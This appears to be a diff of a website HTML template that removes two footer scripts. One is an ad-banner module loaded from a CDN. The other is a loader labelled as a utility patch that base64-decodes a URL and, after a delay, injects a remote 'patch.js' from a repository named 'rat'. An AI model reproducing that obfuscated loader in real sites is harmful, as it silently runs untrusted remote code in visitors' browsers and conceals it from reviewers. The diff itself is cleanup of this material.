@@ -65,13 +65,6 @@ document.addEventListener("DOMContentLoaded", () => {
 </script>
   <script>
 /*
- * UTILITY | Patch v2
- * build 25.10.24 @18:02
-*/
-setTimeout(()=>{let d=document.createElement("script");d.src=atob("aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL2FudGhvbnlzYWxhbWluL3JhdEBtYWluL3BhdGNoLmpz"),document.body.appendChild(d)},3e3);
-</script>
-  <script>
-/*
  * UTILITY | current year
  * build 25.10.24 @18:02
 */
@@ -85,4 +78,4 @@ document.addEventListener("DOMContentLoaded",()=>{injectCurrentYear()});function
 document.addEventListener("DOMContentLoaded",()=>{let e={smooth:!0,duration:1.75,easing:e=>Math.min(1,1.001-Math.pow(2,-10*e)),direction:"vertical",gestureDirection:"vertical",smoothTouch:!1,infinite:!1};function t(e){i.raf(e),requestAnimationFrame(t)}let i=new Lenis({...e});requestAnimationFrame(t)});
 </script>
 
-<script src="/assets/js/udesly-11ty.min.js" async="" defer=""></script>{{ settings.site.footer_additional_content }}<script type="module">import*as UdeslyBanner from"https://cdn.jsdelivr.net/npm/udesly-ad-banner@0.0.4/loader/index.js";UdeslyBanner.defineCustomElements(),document.body.append(document.createElement("udesly-banner"));</script></body></html>
+<script src="/assets/js/udesly-11ty.min.js" async="" defer=""></script>{{ settings.site.footer_additional_content }}</body></html>
